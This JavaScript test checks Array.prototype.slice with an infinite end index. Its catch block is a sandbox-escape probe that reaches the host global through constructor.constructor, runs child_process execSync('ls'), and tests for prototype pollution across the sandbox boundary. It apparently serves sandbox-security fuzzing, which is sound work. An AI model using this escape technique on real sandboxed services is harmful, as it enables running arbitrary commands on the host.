try {
    var x = [
        0,
        1,
        2,
        3,
        4
    ];
    var arr = x.slice(0, Number.POSITIVE_INFINITY);
    arr.getClass = Object.prototype.toString;
    if (arr.getClass() !== '[object ' + 'Array' + ']') {
        $ERROR('#1: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr is Array object. Actual: ' + arr.getClass());
    }
    if (arr.length !== 5) {
        $ERROR('#2: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr.length === 5. Actual: ' + arr.length);
    }
    if (arr[0] !== 0) {
        $ERROR('#3: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[0] === 0. Actual: ' + arr[0]);
    }
    if (arr[1] !== 1) {
        $ERROR('#4: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[1] === 1. Actual: ' + arr[1]);
    }
    if (arr[2] !== 2) {
        $ERROR('#5: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[2] === 2. Actual: ' + arr[2]);
    }
    if (arr[3] !== 3) {
        $ERROR('#6: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[3] === 3. Actual: ' + arr[3]);
    }
    if (arr[4] !== 4) {
        $ERROR('#7: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[4] === 4. Actual: ' + arr[4]);
    }
    if (arr[5] !== undefined) {
        $ERROR('#8: var x = [0,1,2,3,4]; var arr = x.slice(0,Number.POSITIVE_INFINITY); arr[5] === undefined. Actual: ' + arr[5]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}